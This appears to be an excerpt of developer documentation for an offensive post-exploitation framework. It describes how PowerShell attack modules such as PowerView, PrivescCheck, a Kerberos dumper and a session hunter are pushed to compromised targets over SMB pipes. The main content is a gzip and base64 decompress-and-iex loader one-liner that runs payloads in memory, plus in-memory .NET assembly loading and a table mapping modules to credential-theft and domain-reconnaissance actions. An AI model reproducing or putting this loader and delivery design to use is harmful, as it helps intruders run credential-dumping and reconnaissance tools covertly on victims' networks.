...
**Current implementation — gzip+iex one-liner:**

1. Operator gzip-compresses the source code (~5:1 ratio for PS code)
2. Base64-encodes the compressed bytes — single string
3. Sends one command through the standard command dispatch path:
   ```
   $_gz='<b64>';$_m=New-Object IO.MemoryStream(,...);$_s=New-Object IO.Compression.GzipStream($_m,...Decompress);$_o=New-Object IO.MemoryStream;$_s.CopyTo($_o);iex ([Text.Encoding]::UTF8.GetString($_o.ToArray()))
   ```
4. Target's `. ([scriptblock]::Create($cmd))` (dot-source) evaluates the iex in scope L — all
   defined functions persist in the payload scope for subsequent commands

```
Operator                                    Target
  gzip(source) → base64                      ReadLine loop (normal command path)
  iex decompression one-liner   →→→          `. ([scriptblock]::Create($cmd))`
                                ←←←          output + EndMarker
                                             Functions defined by module now live in scope L
```

**Benefits over the old chunked protocol:**
- ~5× smaller transfer (990 KB PowerView → 175 KB compressed; 232 KB PrivescCheck → 172 KB)
- Single round-trip through the pipe — no 186-chunk × multi-exchange overhead over network SMB
- No special target-side protocol handler needed — uses the same readline/dispatch path
- Scope persistence: dot-source ensures loaded functions are available to all subsequent commands

**Binary modules** (`.exe`/`.dll`): `[Reflection.Assembly]::Load(bytes)` — delivered via `Send-Module` same way; target decodes base64 and loads bytes directly.
...
**Important:** All progress messages (`[*] fetching...`, `[+] cached`, `[-] failed`) use `Write-Host`, not `Write-Output`. Functions like `Send-Module` are often called in boolean context (`if (Send-Module ...)`); `Write-Output` would be silently captured as pipeline output and never displayed. `Write-Host` bypasses the pipeline and always appears in the terminal.
...
| `Kerb` | `dumper` | dumper.ps1 | Local Actions | Tier 2 (Tools\) — auto-runs `Invoke-Kirby` in pipe sessions |
...
| `SessionHunter` | `Invoke-SessionHunter` | Invoke-SessionHunter.ps1 | Domain Actions | Tier 2 (Tools\) — pipe sessions use Send-Module (no target outbound HTTP) |
...
**Active session:** streams via `Send-Module` gzip+iex one-liner to target; target finds assembly in `[AppDomain]::CurrentDomain.GetAssemblies()` by name and calls `EntryPoint.Invoke`
